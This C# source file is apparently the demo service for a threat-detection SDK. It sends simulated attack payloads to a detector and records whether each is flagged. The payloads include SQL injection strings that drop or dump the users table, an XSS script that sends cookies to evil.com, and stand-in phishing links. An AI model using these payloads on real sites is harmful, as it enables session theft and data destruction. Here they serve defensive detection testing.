using ThreatDetector.SDK;

namespace ThreatDetector.Demo.Services;

public interface IThreatDemoService
{
    Task<List<ThreatSimulationResult>> RunThreatSimulationsAsync();
    Task<ThreatStatistics> GetThreatStatisticsAsync();
}

public class ThreatDemoService : IThreatDemoService
{
    private readonly IThreatDetectorClient _threatDetectorClient;
    private readonly ILogger<ThreatDemoService> _logger;

    public ThreatDemoService(
        IThreatDetectorClient threatDetectorClient,
        ILogger<ThreatDemoService> logger)
    {
        _threatDetectorClient = threatDetectorClient;
        _logger = logger;
    }

    public async Task<List<ThreatSimulationResult>> RunThreatSimulationsAsync()
    {
        var results = new List<ThreatSimulationResult>();

        try
        {
            // Simulate various threat types
            var simulations = new List<Func<Task<ThreatSimulationResult>>>
            {
                SimulateSqlInjectionAsync,
                SimulateXssAttackAsync,
                SimulateDdosPatternAsync,
                SimulateBruteForceAsync,
                SimulateMalwareUploadAsync,
                SimulateDataExfiltrationAsync,
                SimulatePrivilegeEscalationAsync,
                SimulatePhishingAttemptAsync
            };

            foreach (var simulation in simulations)
            {
                try
                {
                    var result = await simulation();
                    results.Add(result);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error running threat simulation");
                    results.Add(new ThreatSimulationResult
                    {
                        ThreatType = "Unknown",
                        IsDetected = false,
                        ThreatScore = 0,
                        Error = ex.Message
                    });
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error running threat simulations");
        }

        return results;
    }

    public async Task<ThreatStatistics> GetThreatStatisticsAsync()
    {
        try
        {
            var activeThreats = await _threatDetectorClient.GetActiveThreatsAsync();
            
            return new ThreatStatistics
            {
                TotalThreats = activeThreats.Count,
                CriticalThreats = activeThreats.Count(t => t.Severity == "Critical"),
                HighThreats = activeThreats.Count(t => t.Severity == "High"),
                MediumThreats = activeThreats.Count(t => t.Severity == "Medium"),
                LowThreats = activeThreats.Count(t => t.Severity == "Low"),
                ThreatsByType = activeThreats.GroupBy(t => t.ThreatType)
                    .ToDictionary(g => g.Key, g => g.Count()),
                AverageScore = activeThreats.Any() ? activeThreats.Average(t => t.ThreatScore) : 0,
                LastUpdated = DateTime.UtcNow
            };
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error getting threat statistics");
            return new ThreatStatistics();
        }
    }

    private async Task<ThreatSimulationResult> SimulateSqlInjectionAsync()
    {
        var payload = new
        {
            query = "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
            parameters = new[] { "1'; DROP TABLE users; --" },
            userInput = "admin'; UNION SELECT password FROM users WHERE '1'='1",
            attackVector = "SQLInjection",
            riskLevel = "High"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "SQLInjectionDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "SQL Injection",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Attempted SQL injection attack through user input field",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulateXssAttackAsync()
    {
        var payload = new
        {
            userInput = "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            targetField = "comments",
            attackVector = "CrossSiteScripting",
            encodedPayload = "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            riskLevel = "Medium"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "XSSDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Cross-Site Scripting",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Attempted XSS attack through comment field",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulateDdosPatternAsync()
    {
        var payload = new
        {
            requestCount = 10000,
            timeFrame = TimeSpan.FromMinutes(1).TotalSeconds,
            sourceIps = Enumerable.Range(1, 100).Select(i => $"192.168.1.{i}").ToArray(),
            targetEndpoint = "/api/products",
            attackVector = "DDoS",
            riskLevel = "Critical"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "DDoSDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "DDoS Attack",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Distributed denial of service attack pattern detected",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulateBruteForceAsync()
    {
        var payload = new
        {
            username = "admin",
            attemptCount = 50,
            timeFrame = TimeSpan.FromMinutes(5).TotalSeconds,
            passwords = new[] { "password", "123456", "admin", "password123" },
            sourceIp = "192.168.1.100",
            attackVector = "BruteForce",
            riskLevel = "High"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "BruteForceDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Brute Force Attack",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Brute force login attack detected",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulateMalwareUploadAsync()
    {
        var payload = new
        {
            fileName = "invoice.pdf.exe",
            fileSize = 2048000,
            mimeType = "application/octet-stream",
            entropy = 7.9,
            suspiciousStrings = new[] { "keylogger", "backdoor", "encrypt" },
            attachmentSource = "email",
            attackVector = "Malware",
            riskLevel = "Critical"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "MalwareDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Malware Upload",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Suspicious file upload detected",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulateDataExfiltrationAsync()
    {
        var payload = new
        {
            dataVolume = 500000000, // 500MB
            transferSpeed = 50000000, // 50MB/s
            destination = "external-server.com",
            timeOfDay = DateTime.UtcNow.AddHours(-3), // 3 AM
            userRole = "standard_user",
            dataTypes = new[] { "customer_data", "financial_records", "personal_info" },
            attackVector = "DataExfiltration",
            riskLevel = "Critical"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "DataExfiltrationDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Data Exfiltration",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Unusual data transfer pattern suggesting data exfiltration",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulatePrivilegeEscalationAsync()
    {
        var payload = new
        {
            currentRole = "user",
            targetRole = "admin",
            exploitMethod = "buffer_overflow",
            systemCalls = new[] { "execve", "setuid", "chmod" },
            memoryRegions = new[] { "stack", "heap", "code_segment" },
            attackVector = "PrivilegeEscalation",
            riskLevel = "High"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "PrivilegeEscalationDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Privilege Escalation",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Attempted privilege escalation detected",
            Payload = payload,
            DetectionResult = result
        };
    }

    private async Task<ThreatSimulationResult> SimulatePhishingAttemptAsync()
    {
        var payload = new
        {
            emailSubject = "Urgent: Your account will be suspended",
            senderDomain = "microsoft-security.com", // Typosquatting
            suspiciousLinks = new[] { "http://phishing-site.com/login", "http://malicious.com/update" },
            urgencyKeywords = new[] { "urgent", "immediate", "suspend", "expire" },
            socialEngineering = true,
            attackVector = "Phishing",
            riskLevel = "Medium"
        };

        var result = await _threatDetectorClient.AnalyzeThreatAsync(payload, "PhishingDemo");
        
        return new ThreatSimulationResult
        {
            ThreatType = "Phishing Attempt",
            IsDetected = result.IsThreat,
            ThreatScore = result.ThreatScore,
            Description = "Phishing email attempt detected",
            Payload = payload,
            DetectionResult = result
        };
    }
}

public class ThreatSimulationResult
{
    public string ThreatType { get; set; } = string.Empty;
    public bool IsDetected { get; set; }
    public double ThreatScore { get; set; }
    public string Description { get; set; } = string.Empty;
    public object? Payload { get; set; }
    public ThreatDetectionResult? DetectionResult { get; set; }
    public string? Error { get; set; }
}

public class ThreatStatistics
{
    public int TotalThreats { get; set; }
    public int CriticalThreats { get; set; }
    public int HighThreats { get; set; }
    public int MediumThreats { get; set; }
    public int LowThreats { get; set; }
    public Dictionary<string, int> ThreatsByType { get; set; } = new();
    public double AverageScore { get; set; }
    public DateTime LastUpdated { get; set; }
}
